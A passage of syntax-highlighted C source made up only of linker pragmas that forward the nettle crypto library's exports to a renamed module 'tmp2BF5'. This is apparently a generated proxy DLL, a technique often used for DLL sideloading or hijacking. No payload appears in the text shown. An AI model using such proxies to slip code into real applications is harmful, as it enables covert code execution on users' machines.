class="hljs-meta-string">&quot;/export:nettle_cmac128_set_key=tmp2BF5.nettle_cmac128_set_key,@201&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cmac128_update=tmp2BF5.nettle_cmac128_update,@202&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cmac64_digest=tmp2BF5.nettle_cmac64_digest,@203&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cmac64_init=tmp2BF5.nettle_cmac64_init,@204&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cmac64_set_key=tmp2BF5.nettle_cmac64_set_key,@205&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cmac64_update=tmp2BF5.nettle_cmac64_update,@206&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cmac_aes128=tmp2BF5.nettle_cmac_aes128,@207&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cmac_aes128_digest=tmp2BF5.nettle_cmac_aes128_digest,@208&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cmac_aes128_set_key=tmp2BF5.nettle_cmac_aes128_set_key,@209&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cmac_aes128_update=tmp2BF5.nettle_cmac_aes128_update,@210&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cmac_aes256=tmp2BF5.nettle_cmac_aes256,@211&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cmac_aes256_digest=tmp2BF5.nettle_cmac_aes256_digest,@212&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cmac_aes256_set_key=tmp2BF5.nettle_cmac_aes256_set_key,@213&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cmac_aes256_update=tmp2BF5.nettle_cmac_aes256_update,@214&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cmac_des3=tmp2BF5.nettle_cmac_des3,@215&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cmac_des3_digest=tmp2BF5.nettle_cmac_des3_digest,@216&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cmac_des3_set_key=tmp2BF5.nettle_cmac_des3_set_key,@217&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cmac_des3_update=tmp2BF5.nettle_cmac_des3_update,@218&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cnd_memcpy=tmp2BF5.nettle_cnd_memcpy,@219&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ctr_crypt=tmp2BF5.nettle_ctr_crypt,@220&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_des3_decrypt=tmp2BF5.nettle_des3_decrypt,@221&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_des3_encrypt=tmp2BF5.nettle_des3_encrypt,@222&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_des3_set_key=tmp2BF5.nettle_des3_set_key,@223&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_des_check_parity=tmp2BF5.nettle_des_check_parity,@224&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_des_decrypt=tmp2BF5.nettle_des_decrypt,@225&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_des_encrypt=tmp2BF5.nettle_des_encrypt,@226&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_des_fix_parity=tmp2BF5.nettle_des_fix_parity,@227&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_des_set_key=tmp2BF5.nettle_des_set_key,@228&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_eax_aes128=tmp2BF5.nettle_eax_aes128,@229&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_eax_aes128_decrypt=tmp2BF5.nettle_eax_aes128_decrypt,@230&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_eax_aes128_digest=tmp2BF5.nettle_eax_aes128_digest,@231&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_eax_aes128_encrypt=tmp2BF5.nettle_eax_aes128_encrypt,@232&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_eax_aes128_set_key=tmp2BF5.nettle_eax_aes128_set_key,@233&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_eax_aes128_set_nonce=tmp2BF5.nettle_eax_aes128_set_nonce,@234&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_eax_aes128_update=tmp2BF5.nettle_eax_aes128_update,@235&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_eax_decrypt=tmp2BF5.nettle_eax_decrypt,@236&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_eax_digest=tmp2BF5.nettle_eax_digest,@237&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_eax_encrypt=tmp2BF5.nettle_eax_encrypt,@238&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_eax_set_key=tmp2BF5.nettle_eax_set_key,@239&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_eax_set_nonce=tmp2BF5.nettle_eax_set_nonce,@240&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_eax_update=tmp2BF5.nettle_eax_update,@241&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes128=tmp2BF5.nettle_gcm_aes128,@242&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes128_decrypt=tmp2BF5.nettle_gcm_aes128_decrypt,@243&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes128_digest=tmp2BF5.nettle_gcm_aes128_digest,@244&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes128_encrypt=tmp2BF5.nettle_gcm_aes128_encrypt,@245&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes128_set_iv=tmp2BF5.nettle_gcm_aes128_set_iv,@246&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes128_set_key=tmp2BF5.nettle_gcm_aes128_set_key,@247&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes128_update=tmp2BF5.nettle_gcm_aes128_update,@248&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes192=tmp2BF5.nettle_gcm_aes192,@249&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes192_decrypt=tmp2BF5.nettle_gcm_aes192_decrypt,@250&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes192_digest=tmp2BF5.nettle_gcm_aes192_digest,@251&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes192_encrypt=tmp2BF5.nettle_gcm_aes192_encrypt,@252&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes192_set_iv=tmp2BF5.nettle_gcm_aes192_set_iv,@253&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes192_set_key=tmp2BF5.nettle_gcm_aes192_set_key,@254&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes192_update=tmp2BF5.nettle_gcm_aes192_update,@255&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes256=tmp2BF5.nettle_gcm_aes256,@256&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes256_decrypt=tmp2BF5.nettle_gcm_aes256_decrypt,@257&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes256_digest=tmp2BF5.nettle_gcm_aes256_digest,@258&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes256_encrypt=tmp2BF5.nettle_gcm_aes256_encrypt,@259&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes256_set_iv=tmp2BF5.nettle_gcm_aes256_set_iv,@260&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes256_set_key=tmp2BF5.nettle_gcm_aes256_set_key,@261&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes256_update=tmp2BF5.nettle_gcm_aes256_update,@262&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes_decrypt=tmp2BF5.nettle_gcm_aes_decrypt,@263&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes_digest=tmp2BF5.nettle_gcm_aes_digest,@264&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes_encrypt=tmp2BF5.nettle_gcm_aes_encrypt,@265&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes_set_iv=tmp2BF5.nettle_gcm_aes_set_iv,@266&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes_set_key=tmp2BF5.nettle_gcm_aes_set_key,@267&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_aes_update=tmp2BF5.nettle_gcm_aes_update,@268&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_camellia128=tmp2BF5.nettle_gcm_camellia128,@269&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_camellia128_decrypt=tmp2BF5.nettle_gcm_camellia128_decrypt,@270&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_camellia128_digest=tmp2BF5.nettle_gcm_camellia128_digest,@271&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_camellia128_encrypt=tmp2BF5.nettle_gcm_camellia128_encrypt,@272&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_camellia128_set_iv=tmp2BF5.nettle_gcm_camellia128_set_iv,@273&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_camellia128_set_key=tmp2BF5.nettle_gcm_camellia128_set_key,@274&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_camellia128_update=tmp2BF5.nettle_gcm_camellia128_update,@275&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_camellia256=tmp2BF5.nettle_gcm_camellia256,@276&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_camellia256_decrypt=tmp2BF5.nettle_gcm_camellia256_decrypt,@277&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_camellia256_digest=tmp2BF5.nettle_gcm_camellia256_digest,@278&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_camellia256_encrypt=tmp2BF5.nettle_gcm_camellia256_encrypt,@279&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_camellia256_set_iv=tmp2BF5.nettle_gcm_camellia256_set_iv,@280&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_camellia256_set_key=tmp2BF5.nettle_gcm_camellia256_set_key,@281&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_camellia256_update=tmp2BF5.nettle_gcm_camellia256_update,@282&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_decrypt=tmp2BF5.nettle_gcm_decrypt,@283&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_digest=tmp2BF5.nettle_gcm_digest,@284&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_encrypt=tmp2BF5.nettle_gcm_encrypt,@285&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_set_iv=tmp2BF5.nettle_gcm_set_iv,@286&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_set_key=tmp2BF5.nettle_gcm_set_key,@287&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gcm_update=tmp2BF5.nettle_gcm_update,@288&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_get_aeads=tmp2BF5.nettle_get_aeads,@289&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_get_armors=tmp2BF5.nettle_get_armors,@290&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_get_ciphers=tmp2BF5.nettle_get_ciphers,@291&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_get_hashes=tmp2BF5.nettle_get_hashes,@292&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_get_macs=tmp2BF5.nettle_get_macs,@293&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gosthash94=tmp2BF5.nettle_gosthash94,@294&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gosthash94_digest=tmp2BF5.nettle_gosthash94_digest,@295&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gosthash94_init=tmp2BF5.nettle_gosthash94_init,@296&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gosthash94_update=tmp2BF5.nettle_gosthash94_update,@297&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gosthash94cp=tmp2BF5.nettle_gosthash94cp,@298&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gosthash94cp_digest=tmp2BF5.nettle_gosthash94cp_digest,@299&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_gosthash94cp_update=tmp2BF5.nettle_gosthash94cp_update,@300&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hkdf_expand=tmp2BF5.nettle_hkdf_expand,@301&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hkdf_extract=tmp2BF5.nettle_hkdf_extract,@302&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_digest=tmp2BF5.nettle_hmac_digest,@303&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_gosthash94_digest=tmp2BF5.nettle_hmac_gosthash94_digest,@304&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_gosthash94_set_key=tmp2BF5.nettle_hmac_gosthash94_set_key,@305&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_gosthash94_update=tmp2BF5.nettle_hmac_gosthash94_update,@306&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_gosthash94cp_digest=tmp2BF5.nettle_hmac_gosthash94cp_digest,@307&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_gosthash94cp_set_key=tmp2BF5.nettle_hmac_gosthash94cp_set_key,@308&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_gosthash94cp_update=tmp2BF5.nettle_hmac_gosthash94cp_update,@309&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_md5=tmp2BF5.nettle_hmac_md5,@310&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_md5_digest=tmp2BF5.nettle_hmac_md5_digest,@311&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_md5_set_key=tmp2BF5.nettle_hmac_md5_set_key,@312&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_md5_update=tmp2BF5.nettle_hmac_md5_update,@313&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_ripemd160=tmp2BF5.nettle_hmac_ripemd160,@314&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_ripemd160_digest=tmp2BF5.nettle_hmac_ripemd160_digest,@315&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_ripemd160_set_key=tmp2BF5.nettle_hmac_ripemd160_set_key,@316&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_ripemd160_update=tmp2BF5.nettle_hmac_ripemd160_update,@317&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_set_key=tmp2BF5.nettle_hmac_set_key,@318&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_sha1=tmp2BF5.nettle_hmac_sha1,@319&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_sha1_digest=tmp2BF5.nettle_hmac_sha1_digest,@320&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_sha1_set_key=tmp2BF5.nettle_hmac_sha1_set_key,@321&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_sha1_update=tmp2BF5.nettle_hmac_sha1_update,@322&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_sha224=tmp2BF5.nettle_hmac_sha224,@323&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_sha224_digest=tmp2BF5.nettle_hmac_sha224_digest,@324&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_sha224_set_key=tmp2BF5.nettle_hmac_sha224_set_key,@325&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_sha256=tmp2BF5.nettle_hmac_sha256,@326&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_sha256_digest=tmp2BF5.nettle_hmac_sha256_digest,@327&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_sha256_set_key=tmp2BF5.nettle_hmac_sha256_set_key,@328&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_sha256_update=tmp2BF5.nettle_hmac_sha256_update,@329&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_sha384=tmp2BF5.nettle_hmac_sha384,@330&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_sha384_digest=tmp2BF5.nettle_hmac_sha384_digest,@331&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_sha384_set_key=tmp2BF5.nettle_hmac_sha384_set_key,@332&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_sha512=tmp2BF5.nettle_hmac_sha512,@333&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_sha512_digest=tmp2BF5.nettle_hmac_sha512_digest,@334&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_sha512_set_key=tmp2BF5.nettle_hmac_sha512_set_key,@335&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_sha512_update=tmp2BF5.nettle_hmac_sha512_update,@336&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_hmac_update=tmp2BF5.nettle_hmac_update,@337&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_knuth_lfib_get=tmp2BF5.nettle_knuth_lfib_get,@338&quot;</span>)</span><br><span 